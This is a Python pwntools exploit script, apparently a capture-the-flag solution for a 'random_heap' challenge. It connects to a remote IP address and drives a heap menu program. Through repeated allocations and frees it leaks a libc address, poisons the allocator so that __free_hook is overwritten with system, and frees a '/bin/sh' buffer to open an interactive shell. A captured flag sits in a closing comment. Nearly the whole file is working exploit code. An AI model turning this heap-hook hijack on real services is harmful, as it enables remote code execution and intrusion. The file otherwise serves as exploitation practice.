from pwn import *

#context.log_level = 'debug'

p = remote('124.71.140.198','49153')
#p = process('./random_heap')
elf = ELF('./random_heap')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc-2.27.so')

def cmd(ch):
    p.sendlineafter('Your choice: ',str(ch))

def new(idx,size):
    cmd(1)
    p.sendlineafter('Index: ',str(idx))
    p.sendlineafter('Size: ',str(size))

def edit(idx,con):
    cmd(2)
    p.sendlineafter('Index: ',str(idx))
    p.sendafter('Content: ',con)

def show(idx):
    cmd(3)
    p.sendlineafter('Index: ',str(idx))

def free(idx):
    cmd(4)
    p.sendlineafter('Index: ',str(idx))

for i in range(60):
    new(i,0x100)

for i in range(59):
    free(58-i)


for i in range(59):
    new(60,0x100)
    #context.log_level = 'debug'
    show(60)
    p.recvuntil('Content: ')
    temp = u64(p.recv(6)+b'\x00\x00')
    if (temp&0xff0000000000)>>40 == 0x7f:
        libc_base = ((temp-0x3ebe80)&0xfffffffff000)+0x1000
        p.info('libc_base: '+hex(libc_base))
        break

free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']


edit(0,p64(free_hook)+b'A'*0x8+b'\n')
for i in range(63):
    new(i,0x100)
    edit(i,p64(system)+'\n')

new(0,0x10)
edit(0,b'/bin/sh\x00'+b'\n')
free(0)

#gdb.attach(p)
p.interactive()
#flag{bdcef975ec2589f3e58d105d06587798}